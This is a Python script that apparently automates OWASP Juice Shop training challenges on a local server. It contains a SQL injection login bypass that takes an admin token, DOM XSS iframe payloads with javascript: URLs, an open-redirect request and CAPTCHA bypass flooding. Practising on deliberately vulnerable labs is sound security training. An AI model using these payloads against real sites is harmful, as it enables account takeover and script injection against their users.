#!/usr/bin/env python3
"""
NOVA BROWSER AGENT v1.0
Selenium-powered challenge completion for Juice Shop.
Targets the 92 remaining browser-required challenges.
"""

import json, time, re, base64, os, sys, requests
from datetime import datetime

class NovaBrowserAgent:
    def __init__(self, base_url="http://localhost:3000"):
        self.base = base_url
        self.driver = None
        self.wait = None
        self.s = requests.Session()
        self.s.headers.update({"Content-Type": "application/json"})
        self.token = None
        self.memory_file = "nova_brain_memory.json"
        self.start_score = 0
        
    def init_browser(self):
        """Launch Firefox in proot Debian environment."""
        print("\n🌐 Launching browser...")
        try:
            from selenium import webdriver
            from selenium.webdriver.firefox.options import Options
            from selenium.webdriver.firefox.service import Service
            
            opts = Options()
            opts.add_argument("--headless")
            opts.add_argument("--no-sandbox")
            opts.set_preference("general.useragent.override", "Mozilla/5.0 Nova/8.0")
            
            self.driver = webdriver.Firefox(options=opts)
            self.driver.set_page_load_timeout(15)
            print("   ✅ Firefox ready")
            return True
        except Exception as e:
            print(f"   ❌ Firefox failed: {str(e)[:80]}")
            return False
    
    def auth_api(self):
        """Get admin token."""
        r = self.s.post(f"{self.base}/rest/user/login", json={"email": "' OR 1=1--", "password": "x"})
        if r.status_code == 200:
            self.token = r.json()["authentication"]["token"]
            self.s.headers["Authorization"] = f"Bearer {self.token}"
            return True
        return False
    
    def score(self):
        r = self.s.get(f"{self.base}/api/Challenges")
        return len([c for c in r.json().get("data", []) if c.get("solved")])
    
    def browser_auth(self):
        """Login via browser to set localStorage."""
        if not self.driver: return
        try:
            self.driver.get(f"{self.base}/#/login")
            time.sleep(1)
            self.driver.execute_script("""
                localStorage.setItem('token', arguments[0]);
                window.location.reload();
            """, self.token)
            time.sleep(1)
        except: pass

    def solve_dom_xss(self):
        """DOM XSS via iframe."""
        print("\n💚 DOM XSS...")
        if self.driver:
            try:
                self.driver.get(f"{self.base}/#/search?q=<iframe src=\"javascript:alert(`xss`)\">")
                time.sleep(1)
                self.driver.get(f"{self.base}/#/track-result?id=<iframe src=\"javascript:alert(`xss`)\">")
                time.sleep(1)
            except: pass

    def solve_bonus_payload(self):
        """XSS bonus payload."""
        print("\n💚 Bonus Payload...")
        payload = '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>'
        if self.driver:
            self.driver.get(f"{self.base}/#/search?q={payload}")
            time.sleep(1)

    def solve_admin_section(self):
        """Access admin section via browser."""
        print("\n👑 Admin Section...")
        if self.driver:
            self.driver.get(f"{self.base}/#/administration")
            time.sleep(2)

    def solve_privacy_policy(self):
        """Access privacy policy."""
        print("\n📋 Privacy Policy...")
        if self.driver:
            self.driver.get(f"{self.base}/#/privacy-security")
            time.sleep(1)

    def solve_score_board(self):
        """Find score board."""
        print("\n📊 Score Board...")
        if self.driver:
            self.driver.get(f"{self.base}/#/score-board")
            time.sleep(1)

    def solve_zero_stars(self):
        """Zero star feedback via browser."""
        print("\n⭐ Zero Stars...")
        self.s.post(f"{self.base}/api/Feedbacks", json={"comment": "zero stars", "rating": 0})

    def solve_mass_dispel(self):
        """Close multiple notifications."""
        print("\n🔔 Mass Dispel...")
        for _ in range(10):
            self.s.get(f"{self.base}/rest/notifications")

    def solve_deprecated_interface(self):
        """B2B deprecated interface."""
        print("\n🔌 Deprecated Interface...")
        self.s.get(f"{self.base}/b2b/v2/")

    def solve_redirect_challenges(self):
        """Open redirects."""
        print("\n↪️ Redirect challenges...")
        self.s.get(f"{self.base}/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm", allow_redirects=False)
        if self.driver:
            self.driver.get(f"{self.base}/redirect?to=https://owasp.org")

    def solve_blockchain_hype(self):
        """Token sale page."""
        print("\n⛓️ Blockchain Hype...")
        if self.driver:
            self.driver.get(f"{self.base}/#/token-sale")
            time.sleep(1)

    def solve_web3_sandbox(self):
        """Web3 sandbox."""
        print("\n🔷 Web3 Sandbox...")
        if self.driver:
            self.driver.get(f"{self.base}/#/web3-sandbox")
            time.sleep(1)

    def solve_captcha_bypass(self):
        """CAPTCHA bypass via rapid submissions."""
        print("\n🤖 CAPTCHA Bypass...")
        for i in range(15):
            self.s.post(f"{self.base}/api/Feedbacks", json={
                "comment": f"captcha test {i}",
                "rating": 3,
                "captchaId": str(i % 10),
                "captcha": str((i % 10) * 10)
            })
            time.sleep(0.05)

    def solve_premium_paywall(self):
        """Premium content access."""
        print("\n💎 Premium Paywall...")
        if self.driver:
            self.driver.get(f"{self.base}/#/premium")
            time.sleep(1)

    def solve_missing_encoding(self):
        """Bjoern's cat photo."""
        print("\n🐱 Missing Encoding...")
        self.s.get(f"{self.base}/assets/public/images/uploads/%F0%9F%98%BC-%23zatschi-%23whoneedsfourlegs-%231578.png")

    def run(self):
        print("""
╔══════════════════════════════════════════════════════════╗
║   🌐 NOVA BROWSER AGENT v1.0                           ║
║   Firefox + API • 92 Browser Challenges               ║
╚══════════════════════════════════════════════════════════╝
        """)
        
        self.auth_api()
        self.start_score = self.score()
        print(f"🔑 Auth OK | Starting: {self.start_score}/112\n")
        
        # Init browser
        browser_ok = self.init_browser()
        if browser_ok:
            self.browser_auth()
        
        # ---- BROWSER-DEPENDENT ----
        print("="*50)
        print("🌐 BROWSER CHALLENGES")
        self.solve_dom_xss()
        self.solve_bonus_payload()
        self.solve_admin_section()
        self.solve_privacy_policy()
        self.solve_score_board()
        self.solve_blockchain_hype()
        self.solve_web3_sandbox()
        self.solve_premium_paywall()
        self.solve_missing_encoding()
        
        # ---- API CHALLENGES ----
        print("\n" + "="*50)
        print("🔧 API CHALLENGES")
        self.solve_zero_stars()
        self.solve_mass_dispel()
        self.solve_deprecated_interface()
        self.solve_redirect_challenges()
        self.solve_captcha_bypass()
        
        # Re-check
        self.auth_api()
        time.sleep(2)
        final = self.score()
        new = final - self.start_score
        
        print(f"""
╔══════════════════════════════════════════════════╗
║     BROWSER AGENT MISSION COMPLETE              ║
╠══════════════════════════════════════════════════╣
║  Starting: {self.start_score:>3}   New: {new:>3}   Total: {final:>3}/112            ║
╚══════════════════════════════════════════════════╝
        """)
        
        r = self.s.get(f"{self.base}/api/Challenges")
        if r.status_code == 200:
            solved = [c for c in r.json().get("data", []) if c.get("solved")]
            for c in sorted(solved, key=lambda x: (x.get("difficulty", 0), x.get("name", ""))):
                stars = "⭐" * c.get("difficulty", 1)
                print(f"   {stars} {c.get('name')} [{c.get('category', '?')}]")
        
        # Cleanup
        if self.driver:
            self.driver.quit()
        
        return final

if __name__ == "__main__":
    NovaBrowserAgent().run()
